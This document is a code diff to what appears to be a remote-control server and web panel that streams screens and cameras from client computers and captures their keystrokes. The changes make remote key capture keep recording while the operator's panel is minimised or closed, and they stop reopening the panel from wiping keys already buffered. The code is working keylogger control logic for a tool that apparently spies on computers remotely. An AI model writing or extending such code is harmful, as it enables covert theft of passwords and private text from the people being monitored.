@@ -78,6 +78,7 @@ listing_requests = {}
 pushes = {}
 key_events = {}
 key_sequences = {}
+key_capture_active = {}
 mobile_photos = {}
 
 lock = threading.Lock()
@@ -372,6 +373,7 @@ def remove_client(name):
     camera_streams.pop(name, None)
     key_events.pop(name, None)
     key_sequences.pop(name, None)
+    key_capture_active.pop(name, None)
     mobile_photos.pop(name, None)
 
     add_log("warn", f"Computer went offline: {name}")
@@ -4923,7 +4925,7 @@ function liveMaximize() {
 
 function liveMinimize() {
     liveMaximized = false;
-    stopRemoteKeyFeed();
+    pauseRemoteKeyFeed();
     liveStage().classList.add("minimized");
     liveStage().classList.remove("visible", "has-frame");
     document.getElementById("liveModeBar").hidden = true;
@@ -4978,7 +4980,11 @@ function liveScreenStop(reason) {
     const name = liveComputer;
     const wasRunning = liveRunning;
 
-    stopRemoteKeyFeed();
+    if (reason === "switch" || reason === "reset") {
+        stopRemoteKeyFeed();
+    } else {
+        pauseRemoteKeyFeed();
+    }
 
     liveSession += 1;
     if (liveRafId) { cancelAnimationFrame(liveRafId); liveRafId = null; }
@@ -5238,24 +5244,49 @@ let remoteKeySession = 0;
 let remoteKeyAfter = 0;
 let remoteKeyComputer = "";
 let remoteKeyTimer = null;
+let remoteKeyStarted = false;
 
 
 function startRemoteKeyFeed() {
     const name = liveComputer || currentComputer;
     if (!name) return;
-    if (remoteKeyComputer === name) return;
-    stopRemoteKeyFeed();
-    remoteKeyComputer = name;
+
+    if (remoteKeyComputer !== name) {
+        stopRemoteKeyFeed();
+        remoteKeyComputer = name;
+        remoteKeyStarted = false;
+        remoteKeyAfter = 0;
+        capturedKeys = "";
+        renderKeyLine();
+    }
+
+    if (remoteKeyStarted) {
+        if (!remoteKeyTimer) pollRemoteKeys(++remoteKeySession);
+        return;
+    }
+
+    remoteKeyStarted = true;
     remoteKeyAfter = 0;
     const session = ++remoteKeySession;
     api("/api/keys/start", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ name: name })
+    }).then(function() {
+        if (session === remoteKeySession) pollRemoteKeys(session);
     }).catch(function(e) {
-        if (session === remoteKeySession) showToast(e.message, "error", "See keys");
+        if (session === remoteKeySession) {
+            remoteKeyStarted = false;
+            showToast(e.message, "error", "See keys");
+        }
     });
-    pollRemoteKeys(session);
+}
+
+
+function pauseRemoteKeyFeed() {
+    remoteKeySession += 1;
+    clearTimeout(remoteKeyTimer);
+    remoteKeyTimer = null;
 }
 
 
@@ -5265,6 +5296,7 @@ function stopRemoteKeyFeed() {
     remoteKeyTimer = null;
     const name = remoteKeyComputer;
     remoteKeyComputer = "";
+    remoteKeyStarted = false;
     remoteKeyAfter = 0;
     if (!name) return;
     fetch("/api/keys/stop", {
@@ -9729,8 +9761,13 @@ def start_keys():
         if time.time() - client["last_seen"] > OFFLINE_AFTER_SECONDS:
             return jsonify({"error": "Computer is offline"}), 404
 
-        key_events[name] = deque(maxlen=KEY_EVENT_LIMIT)
-        key_sequences[name] = 0
+        # Reopening the panel must not wipe keys captured while it was
+        # closed; only a fresh recording session starts a new buffer.
+        if not key_capture_active.get(name):
+            key_events[name] = deque(maxlen=KEY_EVENT_LIMIT)
+            key_sequences[name] = 0
+
+        key_capture_active[name] = True
 
         client_actions.setdefault(name, queue.Queue()).put({
             "action": "key_capture_start"
@@ -9750,6 +9787,7 @@ def stop_keys():
         return jsonify({"error": "Missing computer name"}), 400
 
     with lock:
+        key_capture_active[name] = False
         client_actions.setdefault(name, queue.Queue()).put({
             "action": "key_capture_stop"
         })
